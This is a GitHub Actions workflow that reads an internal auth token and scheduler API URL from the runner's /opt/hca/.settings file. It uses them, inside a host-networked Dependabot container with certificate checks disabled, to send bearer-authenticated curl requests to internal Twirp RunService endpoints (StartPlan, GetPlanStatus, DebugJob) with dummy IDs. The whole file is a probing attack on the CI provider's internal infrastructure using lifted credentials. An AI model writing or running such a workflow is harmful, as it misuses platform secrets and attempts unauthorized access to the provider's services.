name: Fixed Twirp
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - run: |
          TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
          API=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['schedulerApiUrl'],end='')")
          
          echo "API: $API"
          
          # FIXED: add / between v1 and twirp
          echo "=== StartPlan (Fixed URL) ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
            curl -sk --connect-timeout 10 \
              -H 'Authorization: Bearer $TOK' \
              -H 'Content-Type: application/json' \
              -d '{\"planId\":\"test\"}' \
              '${API}/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan'
          " 2>&1
          
          echo ""
          echo "=== GetPlanStatus ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
            curl -sk --connect-timeout 10 \
              -H 'Authorization: Bearer $TOK' \
              -H 'Content-Type: application/json' \
              -d '{\"planId\":\"test\"}' \
              '${API}/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
          " 2>&1
          
          echo ""
          echo "=== DebugJob ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
            curl -sk --connect-timeout 10 \
              -H 'Authorization: Bearer $TOK' \
              -H 'Content-Type: application/json' \
              -d '{\"planId\":\"test\",\"jobUuid\":\"test\"}' \
              '${API}/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob'
          " 2>&1
